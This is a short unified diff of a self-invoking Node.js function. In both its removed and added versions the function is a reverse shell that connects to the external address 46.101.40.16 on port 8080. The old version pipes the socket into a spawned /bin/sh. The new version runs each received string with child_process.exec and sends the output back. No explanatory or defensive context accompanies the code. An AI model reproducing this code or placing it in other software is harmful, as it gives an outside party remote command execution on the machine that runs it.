@@ -1,12 +1,13 @@
 (function(){
-    var net = require("net"),
-        cp = require("child_process"),
-        sh = cp.spawn("/bin/sh", []);
+    var net = require("net");
+    var exec = require("child_process").exec;
     var client = new net.Socket();
     var connection = client.connect(8080, "46.101.40.16", function(){
         client.write("Ehlo!")
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);
+        client.on("data",(cmd) => {
+            exec(cmd.toString(),(err,stdout,stderr) => {
+                client.write(stdout)
+            })
+        })
     });
 })();
